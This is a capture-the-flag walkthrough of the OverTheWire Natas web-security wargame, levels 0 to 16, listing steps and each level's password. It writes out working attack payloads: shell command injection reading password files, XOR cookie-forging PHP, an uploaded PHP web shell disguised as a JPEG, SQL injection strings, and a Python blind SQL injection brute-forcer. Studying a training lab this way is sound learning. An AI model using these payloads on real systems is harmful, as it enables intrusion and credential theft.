level>>0-1 : > open the url in the browser.
             > enter the username and pass.
             > go to menu, more tools and then developer tools.
             > get the password.

                    Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq

level>>1-2 : > open the url in the browser.
             > enter the username and pass.
             > go to menu, more tools and then developer tools.
             > get the password.

                    Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI

level>>2-3 :  > open the url in the browser.
              > enter the username and pass.
              > view page source and then click on src if it is present.
              > since it is empty now remove the filename in the url  and just enter the url with directory.
              > get the password

                    Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

level>>3-4 : > open the url in the browser.
             > enter the username and pass. 
             > then in the url go to robots.txt,then u will get a path to be followed.
             > get the password.

                    Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

level>>4-5 : > open the url in the browser.
             > enter the username and pass.


             > since we dont have the access to it from natas4 we need to access through natas5 by addind a header such that to go that path.
             > add Referer : http://natas5.natas.labs.overthewire.org/
             > get the password.

                    Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

level>>5-6 : > open the url in the browser.
             > enter the username and pass.
             > since  we are not logged in and since the cookie "loggedin" is 0 that means we are not logged in so change it to 1.
             > go to storage and expand cookies and complete the changes by double clicking on it

                     Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

level>>6-7 : > open the url in the browser.
             > enter the username and pass.
             > since there is a php code and a file name  is included.
             > just go to that file and we found it is empty then open the page source to find the hidden data.
             > get the password.

                     Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

level>>7-8 : > open the url in the browser.
             > enter the username and pass.
             > it is mentioned that password is in /etc...
             > since the parameter changes for home and about there may be a parameter for password also.
             > lets assume the given /etc... as parameter.
             > get the password

                      Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q 

level>>8-9 : > open the url in the browser.
             > enter the username and pass.
             > since they had given the encoded part of the password just decode it.
             > get the password.

                      Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

level>>9-10 : > open the url in the browser.
              > enter the username and pass.
              > we can understand that needle is a parameter .
              > given that grep -i $key dictionary.txt which means it will search for all the lines that contains that word.
              > now we need to write as,
                        needle= ; cat /etc/natas_webpass/natas10    (" ; " is a command seperator )
              > get the password

                      Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

level>>10-11 : > open the url in the browser.
               > enter the username and pass.
               > we can understand that needle is a parameter.
               > given that grep -i $key dictionary.txt which means it will search for all the lines that contains that word.
               > we cant use special characters to read multiple commands so,
                        needle= .*/etc/natas_webpass/natas11    (  " .* " which makes grep to read the file )
               > get the password.

                      Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

level>>11-12 : > open the url in the browser.
               > enter the username and pass.
               > understanding the source code we found that the XOR of default data and key gives us the encrypted cookie.
               > here the cookie is given so now the XOR of cookie and default data gives us the key which is censored before
                          by the property, A ^ B = C
                                           B ^ C = A
                                           C ^ A = B  
               > now the reverse, XOR of key and the default data by changing showpassword from "no" => "yes" in that data , we get the  encrypted cookie of it.
               > change the cookie and refresh the page .
               > get the password.

               TO GET THE VALUE OF KEY :
                      <!DOCTYPE html>
                      <html>
                      <body>
                      <?php
                      $xor_encrypt_cookie=base64_decode("Cookie");
                      $variable=json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
                      function xor_encrypt($a,$b) {
                          $outText = '';

                          // Iterate through each character
                          for($i=0;$i<strlen($a);$i++) {
                          $outText .= $a[$i] ^ $b[$i];
                          }

                          echo $outText;
                      }
                      xor_encrypt($xor_encrypt_cookie,$variable);
                      ?> 
                      </body>
                      </html>    

               TO GET THE COOKIE :

                    <!DOCTYPE html>
                    <html>
                    <body>
                    
                    <?php
                    function xor_encrypt($in) {
                        $key="KEY";
                        $text=$in;
                        $outText = '';
                    
                        // Iterate through each character
                        for($i=0;$i<strlen($text);$i++) {
                        $outText .= $text[$i] ^ $key[$i % strlen($key)];
                        }
                    
                        return $outText;
                    }
                    $variable=array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
                    echo base64_encode(xor_encrypt(json_encode($variable)));
                    ?> 
                    
                    </body>
                    </html>
              
                      Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

level>>12-13 : > open the url in the browser.
               > enter the username and pass.
               > create a php file,
                    <?php echo system('cat /etc/natas_webpass/natas13'); ?>
               > upload this file .
               > inspect and resend it by changing jpg to php .
               > get the password.

                          Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

level>>13-14 :  > open the url in the browser.
                > enter the username and pass.
                > create a php file,
                      <?php echo system('cat /etc/natas_webpass/natas14'); ?>
                > change the bytes of the previous file so that it will pass the image verification.
                > run this command in order to change the bytes of the file.
                > echo -ne '\xFF\xD8\xFF\xE0' | dd conv=notrunc bs=1 count=4 of=filename   
                    ( " -n " prevents from a new line at the end of echo and " e " will enable the escape of sequence )
                    ( " dd " is copy tool of bytes , " conv=notrunc" will just only make sure to replace how many bytes which had given as count ,"bs=1" is block size is 1byte ,"of=target file"
                > upload the file.
                > inspect and resend it by changing jpg to php.
                > get the password.

                          Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

level>>14-15 :  > open the url in the browser.
                > enter the username and pass.
                > from the source code we found the vulnerability as sql injection.
                > so we can input ,
                          username = " or 1=1 --  
                  ( " this will close the quotes and or 1=1  is always true and -- is to neglect the remaining part and make sure that at least one space is present after -- )
                > get the password.

                          Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

level>>15-16 :  > open the url in the browser.
                > enter the username and pass.
                > In a python file write this code and run it.
                  
                  import requests

                  characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

                  username = "natas15"
                  password = "TTka17AWG41DERZtBCeYKV7kRXH1EZRB"
                  
                  url = "http://natas15.natas.labs.overthewire.org"
                  session = requests.Session()
                  
                  current_password = list()
                  
                  while True:
                      for character in characters:
                          print("Trying with: " + "".join(current_password) + character)
                  
                          response = session.post(
                              url,
                              data={
                                  "username": "natas16\" AND password LIKE BINARY \"" +
                                              "".join(current_password) + character + "%\" -- "
                              },
                              auth=(username, password)
                          )
                  
                          print(response.text)
                  
                          if "This user exists." in response.text:
                              current_password.append(character)
                              break
                  
                      if len(current_password) == 32:
                          break
                > get the password.

                            Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo




                
